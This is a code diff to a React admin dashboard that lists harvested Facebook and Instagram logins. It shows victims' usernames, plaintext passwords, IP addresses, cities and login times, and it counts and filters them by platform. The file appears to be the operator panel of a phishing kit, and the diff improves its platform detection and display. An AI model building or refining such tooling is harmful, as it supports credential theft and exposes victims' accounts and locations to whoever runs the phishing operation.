@@ -122,10 +122,13 @@ export default function AdminDashboard() {
   const calculateStats = (data) => {
     const stats = {
       totalEntries: data.length,
-      instagramEntries: data.filter(item => item.username.includes('(IG)')).length,
+      instagramEntries: data.filter(item => 
+        (item.username && item.username.includes('(IG)')) || 
+        (item.platform && item.platform.toLowerCase().includes('instagram'))
+      ).length,
       facebookEntries: data.filter(item => 
-        (item.platform && (item.platform === 'facebook' || item.platform === 'facebook-mobile')) ||
-        (item.username && (item.username.includes('(FB)') || item.username.includes('(FB Mobile)')))
+        (item.username && (item.username.includes('(FB)') || item.username.includes('(FB Mobile)'))) ||
+        (item.platform && ['facebook', 'facebook-mobile', 'fb'].includes(item.platform.toLowerCase()))
       ).length,
       countries: {},
       continents: {}
@@ -162,12 +165,13 @@ export default function AdminDashboard() {
     // Filter by platform
     if (filter === 'instagram') {
       filtered = filtered.filter(cred => 
-        cred.username && cred.username.includes('(IG)')
+        (cred.username && cred.username.includes('(IG)')) || 
+        (cred.platform && cred.platform.toLowerCase().includes('instagram'))
       );
     } else if (filter === 'facebook') {
       filtered = filtered.filter(cred => 
-        (cred.platform && (cred.platform === 'facebook' || cred.platform === 'facebook-mobile')) ||
-        (cred.username && (cred.username.includes('(FB)') || cred.username.includes('(FB Mobile)')))
+        (cred.username && (cred.username.includes('(FB)') || cred.username.includes('(FB Mobile)'))) ||
+        (cred.platform && ['facebook', 'facebook-mobile', 'fb'].includes(cred.platform.toLowerCase()))
       );
     }
     
@@ -450,33 +454,37 @@ export default function AdminDashboard() {
                         </tr>
                       </thead>
                       <tbody>
-                        {filterPlatformData('facebook').length > 0 ? (
-                          filterPlatformData('facebook').map((cred) => (
-                            <tr key={cred.id} className="facebook-row">
-                              <td>
+                        {filterCredentials().map((cred, index) => (
+                          <tr key={cred.id || index} className={
+                            (cred.platform && cred.platform.includes('facebook')) || (cred.username && cred.username.includes('(FB)')) 
+                              ? 'facebook-row' 
+                              : (cred.platform && cred.platform.includes('instagram')) || (cred.username && cred.username.includes('(IG)'))
+                              ? 'instagram-row'
+                              : ''
+                          }>
+                            <td>
+                              {(cred.platform && cred.platform.includes('facebook')) || (cred.username && cred.username.includes('(FB)')) ? (
                                 <><i className="fab fa-facebook"></i> </>
-                                {cred.username}
-                              </td>
-                              <td>{cred.password}</td>
-                              <td>
-                                {cred.city && cred.country ? (
-                                  <>
-                                    <i className="fas fa-map-marker-alt"></i> {cred.city}, {cred.country}
-                                    {cred.continent && <div className="continent"><i className="fas fa-globe"></i> {cred.continent}</div>}
-                                  </>
-                                ) : (
-                                  'Unknown'
-                                )}
-                              </td>
-                              <td>{cred.ip_address || 'Unknown'}</td>
-                              <td>{cred.login_time ? new Date(cred.login_time).toLocaleString() : 'Unknown'}</td>
-                            </tr>
-                          ))
-                        ) : (
-                          <tr>
-                            <td colSpan="5" className="no-data">No credentials found</td>
+                              ) : (cred.platform && cred.platform.includes('instagram')) || (cred.username && cred.username.includes('(IG)')) ? (
+                                <><i className="fab fa-instagram"></i> </>
+                              ) : null}
+                              {cred.username || '(No username)'}
+                            </td>
+                            <td>{cred.password || '(No password)'}</td>
+                            <td>
+                              {cred.city && cred.country ? (
+                                <>
+                                  <i className="fas fa-map-marker-alt"></i> {cred.city}, {cred.country}
+                                  {cred.continent && <div className="continent"><i className="fas fa-globe"></i> {cred.continent}</div>}
+                                </>
+                              ) : (
+                                'Unknown'
+                              )}
+                            </td>
+                            <td>{cred.ip_address || 'Unknown'}</td>
+                            <td>{cred.login_time ? new Date(cred.login_time).toLocaleString() : 'Unknown'}</td>
                           </tr>
-                        )}
+                        ))}
                       </tbody>
                     </table>
                   </div>
